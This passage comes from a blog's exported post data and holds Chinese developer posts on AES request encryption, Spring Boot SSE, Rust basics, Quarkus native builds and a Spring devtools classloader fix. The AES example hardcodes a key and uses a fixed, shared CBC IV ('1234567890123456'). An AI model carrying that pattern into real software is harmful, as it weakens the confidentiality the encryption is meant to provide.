class=\"line\">    <span class=\"keyword\">let</span> encrypted = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">AES</span>.<span class=\"title function_\">encrypt</span>(<span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>.<span class=\"title function_\">parse</span>(body), key, &#123;</span><br><span class=\"line\">        <span class=\"attr\">iv</span>: iv,</span><br><span class=\"line\">        <span class=\"attr\">mode</span>: <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">mode</span>.<span class=\"property\">CBC</span>,</span><br><span class=\"line\">        <span class=\"attr\">padding</span>: <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">pad</span>.<span class=\"property\">Pkcs7</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Base64</span>.<span class=\"title function_\">stringify</span>(encrypted.<span class=\"property\">ciphertext</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//aes解密，body为base64</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">aesDecrypt</span>(<span class=\"params\">secretkey, body</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> key = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>.<span class=\"title function_\">parse</span>(secretkey);</span><br><span class=\"line\">    <span class=\"comment\">//前后端同意iv</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> iv = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>.<span class=\"title function_\">parse</span>(<span class=\"string\">&quot;1234567890123456&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> decrypted = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">AES</span>.<span class=\"title function_\">decrypt</span>(body, key, &#123;</span><br><span class=\"line\">        <span class=\"attr\">iv</span>: iv,</span><br><span class=\"line\">        <span class=\"attr\">mode</span>: <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">mode</span>.<span class=\"property\">CBC</span>,</span><br><span class=\"line\">        <span class=\"attr\">padding</span>: <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">pad</span>.<span class=\"property\">Pkcs7</span></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decrypted.<span class=\"title function_\">toString</span>(<span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//例子</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">密钥：2fC4Q4z6WeD8iQ4TnSP9eBjFR02Ejzw4</span></span><br><span class=\"line\"><span class=\"comment\">请求数据</span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">    &quot;id&quot;:1,</span></span><br><span class=\"line\"><span class=\"comment\">    &quot;desc&quot;: &quot;中文&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">    &quot;timestamp&quot;: 1666767634606</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">JSON.stringify(requestBody)后：&#x27;&#123;&quot;id&quot;:1,&quot;desc&quot;:&quot;中文&quot;,&quot;timestamp&quot;:1666767634606&#125;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">加密后数据：E2ezeNGZRom4HA0OULidnOrBHWBgzbxVf2LCvTrnvqQzmjhODMSEyvJ9q98kp9uu8p07UMzng28K7rScmjfgdA==</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">在实际开发过程中需要对请求数据进行sha-<span class=\"number\">256</span>，同上，此处简化</span><br></pre></td></tr></table></figure>\n<h3 id=\"后端解密请求\"><a href=\"#后端解密请求\" class=\"headerlink\" title=\"后端解密请求\"></a>后端解密请求</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//无第三方依赖，解密</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;2fC4Q4z6WeD8iQ4TnSP9eBjFR02Ejzw4&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">iv</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;1234567890123456&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;E2ezeNGZRom4HA0OULidnOrBHWBgzbxVf2LCvTrnvqQzmjhODMSEyvJ9q98kp9uu8p07UMzng28K7rScmjfgdA==&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">byte</span>[] raw = key.getBytes(StandardCharsets.US_ASCII);</span><br><span class=\"line\"><span class=\"type\">SecretKeySpec</span> <span class=\"variable\">skeySpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecretKeySpec</span>(raw, <span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Cipher</span> <span class=\"variable\">cipher</span> <span class=\"operator\">=</span> Cipher.getInstance(<span class=\"string\">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">IvParameterSpec</span> <span class=\"variable\">ivParameterSpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IvParameterSpec</span>(iv.getBytes());</span><br><span class=\"line\">cipher.init(<span class=\"number\">2</span>, skeySpec, ivParameterSpec);</span><br><span class=\"line\"><span class=\"type\">byte</span>[] encrypted1 = Base64.getDecoder().decode(body);</span><br><span class=\"line\"><span class=\"type\">byte</span>[] original = cipher.doFinal(encrypted1);</span><br><span class=\"line\">System.out.println(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(original, StandardCharsets.UTF_8));</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//无第三方依赖，加密</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;2fC4Q4z6WeD8iQ4TnSP9eBjFR02Ejzw4&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">iv</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;1234567890123456&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;id\\&quot;:1,\\&quot;desc\\&quot;:\\&quot;中文\\&quot;,\\&quot;timestamp\\&quot;:1666767634606&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">byte</span>[] raw = key.getBytes(StandardCharsets.UTF_8);</span><br><span class=\"line\"><span class=\"type\">SecretKeySpec</span> <span class=\"variable\">skeySpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecretKeySpec</span>(raw, <span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//如果传空，则取默认值，平台aes加密时，iv取默认值</span></span><br><span class=\"line\"><span class=\"type\">IvParameterSpec</span> <span class=\"variable\">ivParameterSpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IvParameterSpec</span>(iv.getBytes(StandardCharsets.UTF_8));</span><br><span class=\"line\"><span class=\"type\">Cipher</span> <span class=\"variable\">cipher</span> <span class=\"operator\">=</span> Cipher.getInstance(<span class=\"string\">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class=\"line\">cipher.init(Cipher.ENCRYPT_MODE, skeySpec, ivParameterSpec);</span><br><span class=\"line\"><span class=\"type\">byte</span>[] encrypted = cipher.doFinal(body.getBytes(StandardCharsets.UTF_8));</span><br><span class=\"line\">System.out.println(Base64.getEncoder().encodeToString(encrypted));</span><br></pre></td></tr></table></figure>\n\n","categories":["开发"],"tags":["加密","AES","RSA"]},{"title":"初试服务器推送SSE","url":"/2022/10/28/%E5%88%9D%E8%AF%95%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81SSE/","content":"<p>前端有个耗时的查询比对任务提交，想实时获取比对进程。一般常规都是轮询、长连接、websocket等，今天查到html5里面有个SSE（Server-sent Events），客户端提交一次请求后，由服务端单向推送数据。不支持一次请求客户端再次通信。</p>\n<span id=\"more\"></span>\n<h3 id=\"后端\"><a href=\"#后端\" class=\"headerlink\" title=\"后端\"></a>后端</h3><p>采用已经有的SpringBoot。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;sseDemo&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SseDemoController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(value = &quot;str&quot;, produces = MediaType.TEXT_EVENT_STREAM_VALUE)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> SseEmitter <span class=\"title function_\">str</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置超时时间，客户端超时后会重新发起连接</span></span><br><span class=\"line\">        <span class=\"type\">SseEmitter</span> <span class=\"variable\">sseEmitter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SseEmitter</span>(<span class=\"number\">50000L</span>);</span><br><span class=\"line\">        sseEmitter.onTimeout(() -&gt; &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;超时&quot;</span>);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"comment\">//单独启动线程模拟服务端</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//推送数据</span></span><br><span class=\"line\">                    sseEmitter.send(<span class=\"string\">&quot;data &quot;</span> + i);</span><br><span class=\"line\">                    TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//自定义事件，告知客户端关闭，如果不告知客户端关闭，会导致浏览器无限重连，使用complete也会导致重连</span></span><br><span class=\"line\">                SseEmitter.<span class=\"type\">SseEventBuilder</span> <span class=\"variable\">event</span> <span class=\"operator\">=</span> SseEmitter.event();</span><br><span class=\"line\">                event.name(<span class=\"string\">&quot;close&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//测试用，mediaType用于序列化数据</span></span><br><span class=\"line\">                event.data(<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>(), MediaType.APPLICATION_JSON_UTF8);</span><br><span class=\"line\">                sseEmitter.send(event);</span><br><span class=\"line\">                <span class=\"comment\">//处理完成</span></span><br><span class=\"line\">                sseEmitter.complete();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException | IOException e) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sseEmitter;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>此处未处理id等保证数据获取，实际开发过程中可按需要进行处理</p>\n</blockquote>\n<h3 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> eventSource = <span class=\"keyword\">new</span> <span class=\"title class_\">EventSource</span>(<span class=\"string\">&#x27;/webApi/sseDemo/str&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//默认接收消息</span></span><br><span class=\"line\">eventSource.<span class=\"property\">onmessage</span> = <span class=\"keyword\">function</span> (<span class=\"params\">event</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(event)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//自定义事件</span></span><br><span class=\"line\">eventSource.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;close&#x27;</span>, <span class=\"function\">(<span class=\"params\">event</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(event)</span><br><span class=\"line\">    eventSource.<span class=\"title function_\">close</span>()</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">//打开连接后</span></span><br><span class=\"line\">eventSource.<span class=\"property\">onopen</span> = <span class=\"keyword\">function</span> (<span class=\"params\">event</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(event)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>前端如果超时后会默认断开重连，如果未处理好异常情况，会导致一直发送请求。所以需要设定规则关闭连接，如接收到关闭事件，或者多少次重连或者异常后关闭。</p>\n</blockquote>\n","tags":["SSE","服务器推送"]},{"title":"初次使用rust","url":"/2023/09/19/%E5%88%9D%E6%AC%A1%E4%BD%BF%E7%94%A8rust/","content":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>直接使用<code>scoop</code>进行安装。为了图方便使用的是 gnu。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">scoop install rustup<span class=\"literal\">-gnu</span></span><br></pre></td></tr></table></figure>\n\n<p>安装好后通过<code>rustc --version</code>查看版本</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h3><figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;Hello, world!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译运行</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">rustc main.rs <span class=\"comment\">#编译</span></span><br><span class=\"line\">./main.exe <span class=\"comment\">#运行</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"开发工具\"><a href=\"#开发工具\" class=\"headerlink\" title=\"开发工具\"></a>开发工具</h3><p>使用 VS Code 开发，插件使用<code>rust-analyzer</code>。</p>\n<h3 id=\"猜数字\"><a href=\"#猜数字\" class=\"headerlink\" title=\"猜数字\"></a>猜数字</h3><p>官方第一个例子</p>\n<blockquote>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2MucnVzdC1sYW5nLm9yZy9ib29rL2NoMDEtMDItaGVsbG8td29ybGQuaHRtbA==\">https://doc.rust-lang.org/book/ch01-02-hello-world.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n</blockquote>\n<p>使用 cargo 创建项目，cargo 属于 rust 构建和包管理工具。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cargo new --vcs=none cargo02</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>–vcs&#x3D;none 表示创建时不要版本管理</p>\n</blockquote>\n<p>成品如下：</p>\n<p>Cargo.toml</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[package]</span></span><br><span class=\"line\"><span class=\"attr\">name</span> = <span class=\"string\">&quot;cargo02&quot;</span></span><br><span class=\"line\"><span class=\"attr\">version</span> = <span class=\"string\">&quot;0.1.0&quot;</span></span><br><span class=\"line\"><span class=\"attr\">edition</span> = <span class=\"string\">&quot;2021&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[dependencies]</span></span><br><span class=\"line\"><span class=\"attr\">rand</span> = <span class=\"string\">&quot;0.8.5&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>main.rs</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> std::&#123;cmp::Ordering, io&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> rand::Rng;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;猜数字!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">secret_number</span> = rand::<span class=\"title function_ invoke__\">thread_rng</span>().<span class=\"title function_ invoke__\">gen_range</span>(<span class=\"number\">1</span>..=<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"comment\">// println!(&quot;秘密数字是：&#123;secret_number&#125;&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">loop</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;输入猜想数字.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">guess</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">new</span>();</span><br><span class=\"line\">        io::<span class=\"title function_ invoke__\">stdin</span>().<span class=\"title function_ invoke__\">read_line</span>(&amp;<span class=\"keyword\">mut</span> guess).<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;读取失败!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">let</span> <span class=\"variable\">guess</span>: <span class=\"type\">u32</span> = <span class=\"keyword\">match</span> guess.<span class=\"title function_ invoke__\">trim</span>().<span class=\"title function_ invoke__\">parse</span>() &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">Ok</span>(num) =&gt; num,</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">Err</span>(_) =&gt; <span class=\"keyword\">continue</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;数字：&#123;guess&#125;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">match</span> guess.<span class=\"title function_ invoke__\">cmp</span>(&amp;secret_number) &#123;</span><br><span class=\"line\">            Ordering::Less =&gt; <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;太小&quot;</span>),</span><br><span class=\"line\">            Ordering::Greater =&gt; <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;太大&quot;</span>),</span><br><span class=\"line\">            Ordering::Equal =&gt; &#123;</span><br><span class=\"line\">                <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;猜对了&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>cargo 相关命令：</p>\n<p><code>cargo build</code>：编译项目，编译后 exe 在<code>target/debug</code>目录下；如果在 toml 里面添加依赖后，也可以通过该命令下载依赖包。<br><code>cargo run</code>：运行项目。<br><code>cargo doc --open</code>：查看文档。</p>\n<blockquote>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2MucnVzdC1sYW5nLm9yZy9zdGFibGUvYm9vay8=\">官方文档 https://doc.rust-lang.org/stable/book<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n</blockquote>\n","categories":["rust"],"tags":["rust"]},{"title":"quarkus构建demo","url":"/2023/09/20/quarkus%E6%9E%84%E5%BB%BAdemo/","content":"<p>Quarkus可以很方便通过GraalVm编译本地文件后直接执行，编译后启动非常快。<br>本次通过构建Quarkus项目，然后插件通过docker编译后生成本地文件。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"构建项目\"><a href=\"#构建项目\" class=\"headerlink\" title=\"构建项目\"></a>构建项目</h3><p>可以通过官网教程创建，也可以通过idea直接创建Quarkus，本次为了方便快速体验，通过idea直接创建项目时选择Quarkus。<br>创建后可以在idea中看到项目下插件quarkus。</p>\n<blockquote>\n<p>本次创建项目使用的版本为3.3.2</p>\n</blockquote>\n<h3 id=\"项目启动\"><a href=\"#项目启动\" class=\"headerlink\" title=\"项目启动\"></a>项目启动</h3><p>可以通过maven命令<code>mvn compile quarkus:dev</code><br>启动后默认端口8080，直接访问 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4MDgwLw==\">http://localhost:8080<i class=\"fa fa-external-link-alt\"></i></span> 可以看到启动项目的相关信息。<br>访问示例接口 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4MDgwL2hlbGxv\">http://localhost:8080/hello<i class=\"fa fa-external-link-alt\"></i></span> 可以看到项目中示例接口返回值。</p>\n<p>通过命令启动后默认调试端口为5005，可以启动idea的远程调试debug项目。</p>\n<p>也可以通过idea直接debug启动。如果idea没有自动创建，可以在idea里面创建<code>quarkus</code>启动项目。</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a>打包</h3><p>通过下面命令打包jar</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn clean package &quot;-DskipTests&quot; -U &quot;-Dquarkus.package.type=uber-jar&quot;</span><br></pre></td></tr></table></figure>\n<p>启动jar</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar .\\target\\quarkus-demo02-1.0-SNAPSHOT-runner.jar</span><br></pre></td></tr></table></figure>\n\n<p>打包二进制文件，需要Docker支持</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn clean package -U &quot;-DskipTests&quot; &quot;-Dnative&quot; &quot;-Dquarkus.native.container-build=true&quot; &quot;-Dquarkus.native.builder-image=quay.io/quarkus/ubi-quarkus-mandrel-builder-image:jdk-17&quot;</span><br></pre></td></tr></table></figure>\n<p>之前创建项目使用的是<code>jdk17</code>，所以会通过docker拉取<code>quay.io/quarkus/ubi-quarkus-mandrel-builder-image:jdk-17</code>镜像，通过镜像对项目进行打包。不指定镜像也会默认使用该镜像。<br>打包逻辑是，线通过本地构建需要打包的jar和依赖，再启动docker容器，挂载需要的文件。再容器内通过命令编译为本地文件。</p>\n<p>启动编译后文件，需要在wsl里面执行，编译后是linux可执行二进制文件。可以发现启动速度飞快。</p>\n<p>参考：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm9saW5nY2F2YWxyeS9wLzE3NTY3Mjg5Lmh0bWw=\"> quarkus实战之二：应用的创建、构建、部署<i class=\"fa fa-external-link-alt\"></i></span></p>\n</blockquote>\n","categories":["quarkus"],"tags":["quarkus"]},{"title":"Spring中RestartClassLoader导致静态属性Null","url":"/2023/09/21/Spring%E4%B8%ADRestartClassLoader%E5%AF%BC%E8%87%B4%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7Null/","content":"<p>一次项目改造中，为了兼容一起获取配置代码，在 Spring 启动后，把<code>Environment</code>写入静态属性，其他地方需要获取值时，直接通过静态方法中从<code>Environment</code>内获取。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SystemEnv</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Environment environment;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setEnvironment</span><span class=\"params\">(Environment environment)</span> &#123;</span><br><span class=\"line\">        SystemEnv.environment = environment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">getProperty</span><span class=\"params\">(String key)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> environment.getProperty(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>本地开发测试完成后，其他同事启动，直接<code>NullPointerException</code>，在其电脑上Debug时发现，当前<code>SystemEnv</code>的类加载器为<code>org.springframework.boot.devtools.restart.classloader.RestartClassLoader</code>，因为本地配置了devtool开发导致该类被加载了2次，第一次正常Spring流程启动后设置属性。第二次的时候由<code>RestartClassLoader</code>加载的类，未设置属性，获取时默认null。</p>\n<blockquote>\n<p>本地同样参数启动，测试未能复现第二次由<code>RestartClassLoader</code>加载情况。未找到是否由其他配置导</p>\n</blockquote>\n<p>解决办法：<br>获取属性的时候，判断当前类加载器是否<code>RestartClassLoader</code>，如果是则获取父类加载器。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SystemEnv</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Environment environment;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setEnvironment</span><span class=\"params\">(Environment environment)</span> &#123;</span><br><span class=\"line\">        SystemEnv.environment = environment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">getProperty</span><span class=\"params\">(String key)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getEnvironment().getProperty(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Environment <span class=\"title function_\">getEnvironment</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果已经设置就返回</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (environment != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> environment;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断类加载器，如果是RestartClassLoader获取父类加载器</span></span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">classLoader</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Objects.equals(classLoader.getClass().getSimpleName(), <span class=\"string\">&quot;RestartClassLoader&quot;</span>)) &#123;</span><br><span class=\"line\">            classLoader = classLoader.getParent();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//因为Spring第一次启动会设置值，所以父加载器能获取到值</span></span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> classLoader.loadClass(<span class=\"string\">&quot;com.rtmart.promotion.util.SystemEnv&quot;</span>).getDeclaredField(<span class=\"string\">&quot;environment&quot;</span>);</span><br><span class=\"line\">            field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            environment = (Environment) field.get(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalAccessException | NoSuchFieldException | ClassNotFoundException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> environment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["Spring"],"tags":["Bug","ClassLoader"]},{"title":"通过docker编译rust","url":"/2023/09/22/%E9%80%9A%E8%BF%87docker%E7%BC%96%E8%AF%91rust/","content":"<p>在windows开发后，想编译后在linux里面运行。测试通过docker编译后看能否可以在linux里面运行。<br>linux环境使用的是wsl1 Debian，<br>创建一个普通rust文件demo2.rs：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;Hello, world!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">num</span> = <span class=\"title function_ invoke__\">demo</span>();</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span 